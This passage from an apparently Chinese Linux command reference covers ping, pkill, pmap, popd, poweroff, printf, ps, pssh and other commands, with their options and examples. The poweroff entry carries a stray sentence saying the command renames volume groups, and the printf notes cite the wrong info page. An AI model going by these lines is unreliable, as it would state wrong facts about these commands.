选项\n\n```shell\n-d：使用Socket的SO_DEBUG功能；\n-c<完成次数>：设置完成要求回应的次数；\n-f：极限检测；\n-i<间隔秒数>：指定收发信息的间隔时间；\n-I<网络界面>：使用指定的网络界面送出数据包；\n-l<前置载入>：设置在送出要求信息之前，先行发出的数据包；\n-n：只输出数值；\n-p<范本样式>：设置填满数据包的范本样式；\n-q：不显示指令执行过程，开头和结尾的相关信息除外；\n-r：忽略普通的Routing Table，直接将数据包送到远端主机上；\n-R：记录路由过程；\n-s<数据包大小>：设置数据包的大小；\n-t<存活数值>：设置存活数值TTL的大小；\n-v：详细显示指令的执行过程。\n```\n\n###  参数\n\n目的主机：指定发送ICMP报文的目的主机。\n\n###  实例\n\n```shell\n[root@AY1307311912260196fcZ ~]# ping www.jsdig.com\nPING host.1.jsdig.com (100.42.212.8) 56(84) bytes of data.\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq=1 ttl=50 time=177 ms\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq=2 ttl=50 time=178 ms\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq=3 ttl=50 time=174 ms\n64 bytes from 100-42-212-8.static.webnx.com (100.42.212.8): icmp_seq=4 ttl=50 time=177 ms\n...按Ctrl+C结束\n\n--- host.1.jsdig.com ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 2998ms\nrtt min/avg/max/mdev = 174.068/176.916/178.182/1.683 ms\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ping"]},{"title":"【Linux 命令】pkill","url":"/linux-command/pkill/","content":"\n可以按照进程名杀死进程\n\n## 补充说明\n\n**pkill命令** 可以按照进程名杀死进程。pkill和killall应用方法差不多，也是直接杀死运行中的程序；如果您想杀掉单个进程，请用kill来杀掉。\n\n### 语法\n\n```shell\npkill(选项)(参数)\n```\n\n### 选项\n\n```shell\n-o：仅向找到的最小（起始）进程号发送信号；\n-n：仅向找到的最大（结束）进程号发送信号；\n-P：指定父进程号发送信号；\n-g：指定进程组；\n-t：指定开启进程的终端。\n```\n\n### 参数\n\n进程名称：指定要查找的进程名称，同时也支持类似grep指令中的匹配模式。\n\n### 实例\n\n```shell\npgrep -l gaim\n2979 gaim\n\npkill gaim\n```\n\n也就是说：kill对应的是PID，pkill对应的是command。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pkill"]},{"title":"【Linux 命令】pmap","url":"/linux-command/pmap/","content":"\n报告进程的内存映射关系\n\n## 补充说明\n\n**pmap命令** 用于报告进程的内存映射关系，是Linux调试及运维一个很好的工具。\n\n###  语法\n\n```shell\npmap(选项)(参数)\n```\n\n###  选项\n\n```shell\n-x：显示扩展格式；\n-d：显示设备格式；\n-q：不显示头尾行；\n-V：显示指定版本。\n```\n\n###  参数\n\n进程号：指定需要显示内存映射关系的进程号，可以是多个进程号。\n\n###  实例\n\n```shell\npidof nginx\n13312 5371\n\npmap -x 5371\n5371:   nginx: worker process                \nAddress           Kbytes     RSS   Dirty Mode   Mapping\n0000000000400000     564     344       0 r-x--  nginx\n000000000068c000      68      68      60 rw---  nginx\n000000000069d000      56      12      12 rw---    [ anon ]\n000000000a0c8000    1812    1684    1684 rw---    [ anon ]\n0000003ac0a00000     112      40       0 r-x--  ld-2.5.so\n0000003ac0c1c000       4       4       4 r----  ld-2.5.so\n0000003ac0c1d000       4       4       4 rw---  ld-2.5.so\n0000003ac0e00000    1340     284       0 r-x--  libc-2.5.so\n0000003ac0f4f000    2044       0       0 -----  libc-2.5.so\n0000003ac114e000      16      16       8 r----  libc-2.5.so\n0000003ac1152000       4       4       4 rw---  libc-2.5.so\n0000003ac1153000      20      20      20 rw---    [ anon ]\n0000003ac1200000       8       4       0 r-x--  libdl-2.5.so\n0000003ac1202000    2048       0       0 -----  libdl-2.5.so\n0000003ac1402000       4       4       4 r----  libdl-2.5.so\n0000003ac1403000       4       4       4 rw---  libdl-2.5.so\n0000003ac1600000      84       0       0 r-x--  libselinux.so.1\n0000003ac1615000    2048       0       0 -----  libselinux.so.1\n0000003ac1815000       8       8       8 rw---  libselinux.so.1\n0000003ac1817000       4       4       4 rw---    [ anon ]\n0000003ac1a00000     236       0       0 r-x--  libsepol.so.1\n0000003ac1a3b000    2048       0       0 -----  libsepol.so.1\n0000003ac1c3b000       4       4       4 rw---  libsepol.so.1\n0000003ac1c3c000      40       0       0 rw---    [ anon ]\n0000003ac1e00000      88      44       0 r-x--  libpthread-2.5.so\n0000003ac1e16000    2048       0       0 -----  libpthread-2.5.so\n0000003ac2016000       4       4       4 r----  libpthread-2.5.so\n0000003ac2017000       4       4       4 rw---  libpthread-2.5.so\n0000003ac2018000      16       4       4 rw---    [ anon ]\n0000003ac2600000      80      52       0 r-x--  libz.so.1.2.3\n0000003ac2614000    2044       0       0 -----  libz.so.1.2.3\n0000003ac2813000       4       4       4 rw---  libz.so.1.2.3\n0000003ac2a00000      36       4       0 r-x--  libcrypt-2.5.so\n0000003ac2a09000    2044       0       0 -----  libcrypt-2.5.so\n0000003ac2c08000       4       4       4 r----  libcrypt-2.5.so\n0000003ac2c09000       4       4       4 rw---  libcrypt-2.5.so\n0000003ac2c0a000     184       0       0 rw---    [ anon ]\n0000003ac3600000       8       0       0 r-x--  libkeyutils-1.2.so\n0000003ac3602000    2044       0       0 -----  libkeyutils-1.2.so\n0000003ac3801000       4       4       4 rw---  libkeyutils-1.2.so\n0000003ac3a00000      68       0       0 r-x--  libresolv-2.5.so\n0000003ac3a11000    2048       0       0 -----  libresolv-2.5.so\n0000003ac3c11000       4       4       4 r----  libresolv-2.5.so\n0000003ac3c12000       4       4       4 rw---  libresolv-2.5.so\n0000003ac3c13000       8       0       0 rw---    [ anon ]\n0000003ac3e00000       8       0       0 r-x--  libcom_err.so.2.1\n0000003ac3e02000    2044       0       0 -----  libcom_err.so.2.1\n0000003ac4001000       4       4       4 rw---  libcom_err.so.2.1\n0000003ac4200000    1204       8       0 r-x--  libcrypto.so.0.9.8e\n0000003ac432d000    2044       0       0 -----  libcrypto.so.0.9.8e\n0000003ac452c000     132      88      12 rw---  libcrypto.so.0.9.8e\n0000003ac454d000      16      12      12 rw---    [ anon ]\n0000003ac4600000     176       0       0 r-x--  libgssapi_krb5.so.2.2\n0000003ac462c000    2048       0       0 -----  libgssapi_krb5.so.2.2\n0000003ac482c000       8       8       8 rw---  libgssapi_krb5.so.2.2\n0000003ac4a00000     144       0       0 r-x--  libk5crypto.so.3.1\n0000003ac4a24000    2044       0       0 -----  libk5crypto.so.3.1\n0000003ac4c23000       8       8       8 rw---  libk5crypto.so.3.1\n0000003ac4e00000      32       0       0 r-x--  libkrb5support.so.0.1\n0000003ac4e08000    2044       0       0 -----  libkrb5support.so.0.1\n0000003ac5007000       4       4       4 rw---  libkrb5support.so.0.1\n0000003ac5200000     580       0       0 r-x--  libkrb5.so.3.3\n0000003ac5291000    2048       0       0 -----  libkrb5.so.3.3\n0000003ac5491000      16      16      12 rw---  libkrb5.so.3.3\n0000003ac5a00000     288       4       0 r-x--  libssl.so.0.9.8e\n0000003ac5a48000    2048       0       0 -----  libssl.so.0.9.8e\n0000003ac5c48000      24      16      12 rw---  libssl.so.0.9.8e\n00002b5751808000       8       8       8 rw---    [ anon ]\n00002b5751810000     108      36       0 r-x--  libpcre.so.1.2.0\n00002b575182b000    2044       0       0 -----  libpcre.so.1.2.0\n00002b5751a2a000       4       4       4 rw---  libpcre.so.1.2.0\n00002b5751a2b000      28      28      28 rw---    [ anon ]\n00002b5751a32000      40      20       0 r-x--  libnss_files-2.5.so\n00002b5751a3c000    2044       0       0 -----  libnss_files-2.5.so\n00002b5751c3b000       4       4       4 r----  libnss_files-2.5.so\n00002b5751c3c000       4       4       4 rw---  libnss_files-2.5.so\n00002b5751c3d000       4       4       4 rw-s-  zero (deleted)\n00002b5751c3e000   20012   20000   20000 rw---    [ anon ]\n00007fffbf2ce000      84      20      20 rw---    [ stack ]\n00007fffbf35e000      12       0       0 r-x--    [ anon ]\nffffffffff600000    8192       0       0 -----    [ anon ]\n----------------  ------  ------  ------\ntotal kB           72880   22940   22000\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pmap"]},{"title":"【Linux 命令】popd","url":"/linux-command/popd/","content":"\n从目录堆栈中删除目录。\n\n## 概要\n\n```shell\npopd [-n] [+N | -N]\n```\n\n## 主要用途\n\n- 从目录堆栈中删除目录，如果是顶部目录被删除，那么当前工作目录会切换到新的顶部目录。\n\n- 没有参数时，删除目录堆栈顶部。\n\n## 选项\n\n```shell\n-n    抑制删除目录引起的当前工作目录变化。\n```\n\n## 参数\n\n+N（可选）：不带参数执行`dirs`命令显示的列表中，左起的第N个目录将被删除。（从0开始计数）\n\n-N（可选）：不带参数执行`dirs`命令显示的列表中，右起的第N个目录将被删除。（从0开始计数）\n\n\n## 返回值\n\n返回成功除非提供了非法选项或执行出现错误。\n\n## 例子\n\n```shell\n# 添加目录到堆栈，当前工作目录不变。\n[user2@pc ~]$ dirs\n~\n[user2@pc ~]$ pushd -n ~/Desktop\n~ ~/Desktop\n[user2@pc ~]$ pushd -n ~/Pictures\n~ ~/Pictures ~/Desktop\n[user2@pc ~]$ pushd -n ~/bin\n~ ~/bin ~/Pictures ~/Desktop\n\n# 从目录堆栈中删除目录，删除顶部目录时会改变当前工作目录：\n[user2@pc ~]$ popd -2\n~ ~/Pictures ~/Desktop\n[user2@pc ~]$ popd +1\n~ ~/Desktop\n[user2@pc ~]$ popd\n~/Desktop\n[user2@pc Desktop]$\n```\n\n```shell\n# 从目录堆栈中删除目录，删除顶部目录时不会改变当前工作目录：\n[user2@pc ~]$ dirs\n~\n[user2@pc ~]$ pushd -n ~/Desktop\n~ ~/Desktop\n[user2@pc ~]$ popd -n\n~\n[user2@pc ~]$ \n```\n\n### 注意\n\n1. `bash`的目录堆栈命令包括`dirs popd pushd`。\n2. 当前目录始终是目录堆栈的顶部。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n### 参考链接\n\n- [popd、pushd命令'-n'选项的行为](https://superuser.com/questions/784450/popd-and-pushd-behavior-with-n-option)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","popd"]},{"title":"【Linux 命令】poweroff","url":"/linux-command/poweroff/","content":"\n关闭Linux系统，关闭记录会被写入到/var/log/wtmp日志文件中\n\n## 补充说明\n\n**grename命令** 可以重命名卷组的名称。\n\n###  语法\n\n```shell\npoweroff [选项]\n```\n\n###  选项\n\n```shell\n-n 关闭之前不同步\n-p 当被称为halt时关闭电源\n-v 增加输出，包括消息\n-q 降低输出错误唯一的消息\n-w 并不实际关闭系统，只是写入/var/log/wtmp文件中\n-f 强制关机，不调用shutdown\n```\n\n### 例子\n\n关闭Linux系统。\n\n```shell\n[root@localhost ~]# poweroff\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","poweroff"]},{"title":"【Linux 命令】ppp-off","url":"/linux-command/ppp-off/","content":"\n关闭ppp连线\n\n## 补充说明\n\n这是Slackware发行版内附的程序，让用户切断PPP的网络连线。\n\n###  语法\n\n```shell\nppp-off\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ppp-off"]},{"title":"【Linux 命令】pr","url":"/linux-command/pr/","content":"\n将文本文件转换成适合打印的格式\n\n## 补充说明\n\n**pr命令** 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。\n\n###  语法\n\n```shell\npr(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h<标题>：为页指定标题；\n-l<行数>：指定每页的行数。\n```\n\n###  参数\n\n文件：需要转换格式的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pr"]},{"title":"【Linux 命令】printf","url":"/linux-command/printf/","content":"\n格式化并输出结果。\n\n## 目录\n\n- [bash内建命令](#内建命令)\n- [GNU coreutils中的命令](#外部命令)\n\n## 内建命令\n\n#### 概要\n\n```shell\nprintf [-v var] format [arguments]\n```\n\n#### 主要用途\n\n- 格式化参数并输出。\n\n#### 选项\n\n```shell\n-v var：将结果输出到变量var中而不是输出到标准输出。\n```\n\n#### 参数\n\nformat：输出格式。\n\narguments：一到多个参数。\n\n```shell\n转义序列：除了支持printf(1)和printf(3)的转义序列，内建printf还支持以下转义序列：\n\n%b       展开参数中的反斜杠转义字符。\n%q       将参数扩起以用作shell输入。\n%(fmt)T  根据strftime(3)中的转义字符来输出日期时间字符串。\n```\n\n#### 返回值\n\n返回状态为成功除非给出了非法选项、写错误、赋值错误。\n\n#### 例子\n\n```shell\n# %-5s 格式为左对齐且宽度为5的字符串代替（'-'表示左对齐），不使用则默认右对齐。\n# %-4.2f 格式为左对齐宽度为4，保留两位小数。\n\nprintf \"%-5s %-10s %-4s\\n\" NO Name Mark\nprintf \"%-5s %-10s %-4.2f\\n\" 01 Tom 90.3456\nprintf \"%-5s %-10s %-4.2f\\n\" 02 Jack 89.2345\nprintf \"%-5s %-10s %-4.2f\\n\" 03 Jeff 98.4323\n\n# 输出\nNO    Name       Mark\n01    Tom        90.35\n02    Jack       89.23\n03    Jeff       98.43\n\n\n# %b %q %(fmt)T 的例子。\n# see it again with a newline.\nprintf \"%s\\n\" 'hello world'\n# 展开换行符，和上面的结果一样。\nprintf \"%b\" 'hello world\\n'\n\nprintf '%q\\n' 'a b c'\n# 输出\na\\ b\\ c\n\n# %z为时区，%n为换行符。\nprintf \"%(%F %T %z%n)T\"\n# 输出\n2019-09-10 01:48:07 +0000\n```\n\n#### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n## 外部命令\n\n#### 概要\n\n```shell\nprintf FORMAT [ARGUMENT]...\nprintf OPTION\n```\n\n#### 主要用途\n\n- 格式化参数并输出。\n\n\n#### 选项\n\n```shell\n--help 显示帮助信息并退出。\n--version 显示版本信息并退出。\n```\n\n#### 参数\n\nformat：输出格式。\n\narguments：一到多个参数。\n\n```shell\n在这里忽略了（%b %q），如果你安装的coreutils版本支持它们，那么请参考上面的例子。\n支持的转义序列：\n\n\\\"          双引号\n\\\\          反斜杠\n\\a          响铃\n\\b          退格\n\\c          截断输出\n\\e          退出\n\\f          翻页\n\\n          换行\n\\r          回车\n\\t          水平制表符\n\\v          竖直制表符\n\\NNN        八进制数 (1到3位数字)\n\\xHH        十六进制数 (1到2位数字)\n\\uHHHH      Unicode字符附加4位十六进制数字\n\\UHHHHHHHH  Unicode字符附加8位十六进制数字\n%%          百分号\n\n以及'diouxXfeEgGcs'中的一个结尾的C格式规范，将被转换为正确的类型并处理可变宽度。\n```\n\n#### 例子\n\n```shell\n# 使用 /usr/bin/printf 确保调用的不是内建命令。\n# 当然，在你关闭内建printf以及确认当前环境没有printf函数的情况下，可直接使用printf，详见末尾\"注意\"的链接。\n\n# 按行打印数组和关联数组的下标及值。\n\n# 声明数组可以不加'declare -a'或'local -a'（在函数内声明的局部变量）。\narr=('line1' 'line2')\n/usr/bin/printf \"%s\\n\" ${!arr[@]}\n# 输出下标\n0\n1\n/usr/bin/printf \"%s\\n\" ${arr[@]}\n# 输出值\nline1\nline2\n\n#声明关联数组（也就是字典）必须加'declare -A'或'local -A'（在函数内声明的局部变量）。\ndeclare -A assoc_arr=(['key1']='value1' ['key2']='value2')\n/usr/bin/printf \"%s\\n\" ${!assoc_arr[@]}\n# 输出键。\nkey2\nkey1\n/usr/bin/printf \"%s\\n\" ${assoc_arr[@]}\n# 输出值。\nvalue2\nvalue1\n```\n\n#### 返回值\n\n返回状态为成功除非给出了非法选项等。\n\n#### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 printf`或`info coreutils 'pwd invocation'`。\n\n2. 启动或关闭内建命令请查看`enable`命令，关于同名优先级的问题请查看`builtin`命令的例子部分的相关讨论。\n\n3. 我通过和`bug-bash@gnu.org`的交流，得到了关于这几个格式说明符`%b %q %(fmt)T`的解释：\n   > printf(1)中的%b格式说明符是printf(3)支持的格式之外增加的一个POSIX特性。\n   >\n   > %q和%T说明符是非标准的，并且不受所有独立实现的printf的支持。\n   \n   更多细节请参考链接：\n   - [POSIX printf](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html)\n   `APPLICATION USAGE`段落的第五节。\n   - [POSIX printf格式说明符](https://pubs.opengroup.org/onlinepubs/9699919799/functions/printf.html)\n   的`Description`段落。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","printf"]},{"title":"【Linux 命令】protoize","url":"/linux-command/protoize/","content":"\nGNU-C代码转换为ANSI-C代码\n\n## 补充说明\n\n**protoize命令** 属于gcc套件，用于为C语言源代码文件添加函数原型，将GNU-C代码转换为ANSI-C代码。\n\n### 语法\n\n```shell\nprotoize(选项)(参数)\n```\n\n### 选项\n\n```shell\n-d：设置需要转换代码的目录；\n-x：转换代码时排除的文件。\n```\n\n### 参数\n\n文件：需要转换代码的C语言源文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","protoize"]},{"title":"【Linux 命令】ps","url":"/linux-command/ps/","content":"\n报告当前系统的进程状态\n\n## 补充说明\n\n**ps命令** 用于报告当前系统的进程状态。可以搭配kill指令随时中断、删除不必要的程序。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。\n\n### 语法\n\n```shell\nps(选项)\n```\n\n### 选项\n\n```shell\n-a：显示所有终端机下执行的程序，除了阶段作业领导者之外。\na：显示现行终端机下的所有程序，包括其他用户的程序。\n-A：显示所有程序。\n-c：显示CLS和PRI栏位。\nc：列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。\n-C<指令名称>：指定执行指令的名称，并列出该指令的程序的状况。\n-d：显示所有程序，但不包括阶段作业领导者的程序。\n-e：此选项的效果和指定\"A\"选项相同。\ne：列出程序时，显示每个程序所使用的环境变量。\n-f：显示UID,PPIP,C与STIME栏位。\nf：用ASCII字符显示树状结构，表达程序间的相互关系。\n-g<群组名称>：此选项的效果和指定\"-G\"选项相同，当亦能使用阶段作业领导者的名称来指定。\ng：显示现行终端机下的所有程序，包括群组领导者的程序。\n-G<群组识别码>：列出属于该群组的程序的状况，也可使用群组名称来指定。\nh：不显示标题列。\n-H：显示树状结构，表示程序间的相互关系。\n-j或j：采用工作控制的格式显示程序状况。\n-l或l：采用详细的格式来显示程序状况。\nL：列出栏位的相关信息。\n-m或m：显示所有的执行绪。\nn：以数字来表示USER和WCHAN栏位。\n-N：显示所有的程序，除了执行ps指令终端机下的程序之外。\n-p<程序识别码>：指定程序识别码，并列出该程序的状况。\np<程序识别码>：此选项的效果和指定\"-p\"选项相同，只在列表格式方面稍有差异。\nr：只列出现行终端机正在执行中的程序。\n-s<阶段作业>：指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。\ns：采用程序信号的格式显示程序状况。\nS：列出程序时，包括已中断的子程序资料。\n-t<终端机编号>：指定终端机编号，并列出属于该终端机的程序的状况。\nt<终端机编号>：此选项的效果和指定\"-t\"选项相同，只在列表格式方面稍有差异。\n-T：显示现行终端机下的所有程序。\n-u<用户识别码>：此选项的效果和指定\"-U\"选项相同。\nu：以用户为主的格式来显示程序状况。\n-U<用户识别码>：列出属于该用户的程序的状况，也可使用用户名称来指定。\nU<用户名称>：列出属于该用户的程序的状况。\nv：采用虚拟内存的格式显示程序状况。\n-V或V：显示版本信息。\n-w或w：采用宽阔的格式来显示程序状况。　\nx：显示所有程序，不以终端机来区分。\nX：采用旧式的Linux i386登陆格式显示程序状况。\n-y：配合选项\"-l\"使用时，不显示F(flag)栏位，并以RSS栏位取代ADDR栏位　。\n-<程序识别码>：此选项的效果和指定\"p\"选项相同。\n--cols<每列字符数>：设置每列的最大字符数。\n--columns<每列字符数>：此选项的效果和指定\"--cols\"选项相同。\n--cumulative：此选项的效果和指定\"S\"选项相同。\n--deselect：此选项的效果和指定\"-N\"选项相同。\n--forest：此选项的效果和指定\"f\"选项相同。\n--headers：重复显示标题列。\n--help：在线帮助。\n--info：显示排错信息。\n--lines<显示列数>：设置显示画面的列数。\n--no-headers：此选项的效果和指定\"h\"选项相同，只在列表格式方面稍有差异。\n--group<群组名称>：此选项的效果和指定\"-G\"选项相同。\n--Group<群组识别码>：此选项的效果和指定\"-G\"选项相同。\n--pid<程序识别码>：此选项的效果和指定\"-p\"选项相同。\n--rows<显示列数>：此选项的效果和指定\"--lines\"选项相同。\n--sid<阶段作业>：此选项的效果和指定\"-s\"选项相同。\n--tty<终端机编号>：此选项的效果和指定\"-t\"选项相同。\n--user<用户名称>：此选项的效果和指定\"-U\"选项相同。\n--User<用户识别码>：此选项的效果和指定\"-U\"选项相同。\n--version：此选项的效果和指定\"-V\"选项相同。\n--widty<每列字符数>：此选项的效果和指定\"-cols\"选项相同。\n```\n\n由于ps命令能够支持的系统类型相当的多，所以选项多的离谱！\n\n### 实例\n\n```shell\nps axo pid,comm,pcpu # 查看进程的PID、名称以及CPU 占用率\nps aux | sort -rnk 4 # 按内存资源的使用量对进程进行排序\nps aux | sort -nk 3  # 按 CPU 资源的使用量对进程进行排序\nps -A # 显示所有进程信息\nps -u root # 显示指定用户信息\nps -efL # 查看线程数\nps -e -o \"%C : %p :%z : %a\"|sort -k5 -nr # 查看进程并按内存使用大小排列\nps -ef # 显示所有进程信息，连同命令行\nps -ef | grep ssh # ps 与grep 常用组合用法，查找特定进程\nps -C nginx # 通过名字或命令搜索进程\nps aux --sort=-pcpu,+pmem # CPU或者内存进行排序,-降序，+升序\nps -f --forest -C nginx # 用树的风格显示进程的层次关系\nps -o pid,uname,comm -C nginx # 显示一个父进程的子进程\nps -e -o pid,uname=USERNAME,pcpu=CPU_USAGE,pmem,comm # 重定义标签\nps -e -o pid,comm,etime # 显示进程运行的时间\nps -aux | grep named # 查看named进程详细信息\nps -o command -p 91730 | sed -n 2p # 通过进程id获取服务名称\n```\n\n将目前属于您自己这次登入的 PID 与相关信息列示出来\n\n```shell\nps -l\n#  UID   PID  PPID        F CPU PRI NI       SZ    RSS WCHAN     S             ADDR TTY           TIME CMD\n#  501   566   559     4006   0  31  0  4317620    228 -      Ss                  0 ttys001    0:00.05 /App...cOS/iTerm2 --server /usr/bin/login -fpl kenny /Ap...s/MacOS/iTerm2 --launch_shel\n#  501   592   577     4006   0  31  0  4297048     52 -      S                   0 ttys001    0:00.63 -zsh\n```\n\n- F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user\n- S 代表这个程序的状态 (STAT)，关于各 STAT 的意义将在内文介绍\n- UID 程序被该 UID 所拥有\n- PID 就是这个程序的 ID ！\n- PPID 则是其上级父程序的ID\n- C CPU 使用的资源百分比\n- PRI 这个是 Priority (优先执行序) 的缩写，详细后面介绍\n- NI 这个是 Nice 值，在下一小节我们会持续介绍\n- ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 \"-\"\n- SZ 使用掉的内存大小\n- WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作\n- TTY 登入者的终端机位置\n- TIME 使用掉的 CPU 时间。\n- CMD 所下达的指令为何\n\n> 在预设的情况下， `ps` 仅会列出与目前所在的 `bash shell` 有关的 `PID` 而已，所以， 当我使用 `ps -l` 的时候，只有三个 PID。\n\n列出目前所有的正在内存当中的程序\n\n```shell\nps aux\n\n# USER               PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND\n# kenny             6155  21.3  1.7  7969944 284912   ??  S    二03下午 199:14.14 /Appl...OS/WeChat\n# kenny              559  20.4  0.8  4963740 138176   ??  S    二03下午  33:28.27 /Appl...S/iTerm2\n# _windowserver      187  18.0  0.6  7005748  95884   ??  Ss   二03下午 288:44.97 /Syst...Light.WindowServer -daemon\n# kenny             1408  10.7  2.1  5838592 347348   ??  S    二03下午 138:51.63 /Appl...nts/MacOS/Google Chrome\n# kenny              327   5.8  0.5  5771984  79452   ??  S    二03下午   2:51.58 /Syst...pp/Contents/MacOS/Finder\n```\n\n- USER：该 process 属于那个使用者账号的\n- PID ：该 process 的号码\n- %CPU：该 process 使用掉的 CPU 资源百分比\n- %MEM：该 process 所占用的物理内存百分比\n- VSZ ：该 process 使用掉的虚拟内存量 (Kbytes)\n- RSS ：该 process 占用的固定的内存量 (Kbytes)\n- TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。\n- STAT：该程序目前的状态，主要的状态有\n- R ：该程序目前正在运作，或者是可被运作\n- S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。\n- T ：该程序目前正在侦测或者是停止了\n- Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态\n- START：该 process 被触发启动的时间\n- TIME ：该 process 实际使用 CPU 运作的时间\n- COMMAND：该程序的实际指令\n\n列出类似程序树的程序显示\n\n```shell\nps -axjf\n\n# USER               PID  PPID  PGID   SESS JOBC STAT   TT       TIME COMMAND            UID   C STIME   TTY\n# root                 1     0     1      0    0 Ss     ??   10:51.90 /sbin/launchd        0   0 二03下午 ??\n# root                50     1    50      0    0 Ss     ??    0:10.07 /usr/sbin/syslog     0   0 二03下午 ??\n# root                51     1    51      0    0 Ss     ??    0:29.90 /usr/libexec/Use     0   0 二03下午 ??\n```\n\n找出与 cron 与 syslog 这两个服务有关的 PID 号码\n\n```shell\nps aux | egrep '(cron|syslog)'\n\n# root                50   0.0  0.0  4305532   1284   ??  Ss   二03下午   0:10.08 /usr/sbin/syslogd\n# kenny            90167   0.0  0.0  4258468    184 s007  R+    9:23下午   0:00.00 egrep (cron|syslog)\n```\n\n把所有进程显示出来，并输出到ps001.txt文件\n\n```shell\nps -aux > ps001.txt\n```\n\n输出指定的字段\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ps"]},{"title":"【Linux 命令】pssh","url":"/linux-command/pssh/","content":"\n批量管理执行\n\n## 补充说明\n\n**pssh命令** 是一个python编写可以在多台服务器上执行命令的工具，同时支持拷贝文件，是同类工具中很出色的，类似pdsh，个人认为相对pdsh更为简便，使用必须在各个服务器上配置好密钥认证访问。\n\n### 安装pssh\n\n在CentOS系统环境下，介绍yum的安装和源码安装的方式：\n\n **yum方法** \n\n```shell\nyum install pssh\n```\n\n **编译安装** \n\n```shell\nwget http://parallel-ssh.googlecode.com/files/pssh-2.3.1.tar.gz\ntar xf pssh-2.3.1.tar.gz\ncd pssh-2.3.1/\npython setup.py install\n```\n\n### 选项\n\n```shell\n--version：查看版本\n--help：查看帮助，即此信息\n-h：主机文件列表，内容格式”[user@]host[:port]”\n-H：主机字符串，内容格式”[user@]host[:port]”\n-：登录使用的用户名\n-p：并发的线程数【可选】\n-o：输出的文件目录【可选】\n-e：错误输入文件【可选】\n-t：TIMEOUT 超时时间设置，0无限制【可选】\n-O：SSH的选项\n-v：详细模式\n-A：手动输入密码模式\n-x：额外的命令行参数使用空白符号，引号，反斜线处理\n-X：额外的命令行参数，单个参数模式，同-x\n-i：每个服务器内部处理信息输出\n-P：打印出服务器返回信息\n```\n\n### 实例\n\n获取每台服务器的uptime：\n\n```shell\n# pssh -h ip.txt -i uptime\n[1] 11:15:03 [SUCCESS] Mar.mars.he\n11:15:11 up 4 days, 16:25,  1 user,  load average: 0.00, 0.00, 0.00\n[2] 11:15:03 [SUCCESS] Jan.mars.he\n11:15:12 up 3 days, 23:26,  0 users,  load average: 0.00, 0.00, 0.00\n[3] 11:15:03 [SUCCESS] Feb.mars.he\n11:15:12 up 4 days, 16:26,  2 users,  load average: 0.08, 0.02, 0.01\n```\n\n查看每台服务器上mysql复制IO/SQL线程运行状态信息：\n\n```shell\n# pssh -h IP.txt -i \"/usr/local/mysql/bin/mysql -e 'show slave status \\G'\"|grep Running:\n             Slave_IO_Running: yes\n            Slave_SQL_Running: Yes\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n```\n\n保存每台服务器运行的结果：\n\n```shell\n# pssh -h IP.txt -i -o /tmp/pssh/ uptime\n[1] 11:19:47 [SUCCESS] Feb.mars.he\n11:19:55 up 4 days, 16:31,  2 users,  load average: 0.02, 0.03, 0.00\n[2] 11:19:47 [SUCCESS] Jan.mars.he\n11:19:56 up 3 days, 23:30,  0 users,  load average: 0.01, 0.00, 0.00\n[3] 11:19:47 [SUCCESS] Mar.mars.he\n11:19:56 up 4 days, 16:30,  1 user,  load average: 0.00, 0.00, 0.00\n```\n\n我们来看一下/tmp/pssh/下的文件及其内容\n\n```shell\n# ll /tmp/pssh/\n总用量 12\n-rw-r--r--. 1 root root 70 12月  1 11:19 Feb.mars.he\n-rw-r--r--. 1 root root 70 12月  1 11:19 Jan.mars.he\n-rw-r--r--. 1 root root 69 12月  1 11:19 Mar.mars.he\n\n# cat /tmp/pssh/*\n11:19:55 up 4 days, 16:31,  2 users,  load average: 0.02, 0.03, 0.00\n11:19:56 up 3 days, 23:30,  0 users,  load average: 0.01, 0.00, 0.00\n11:19:56 up 4 days, 16:30,  1 user,  load average: 0.00, 0.00, 0.00\n```\n\n上面介绍的是pssh命令很少的一部分，大家可以将其用到适合自己的场景，发挥它的最大功效。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pssh"]},{"title":"【Linux 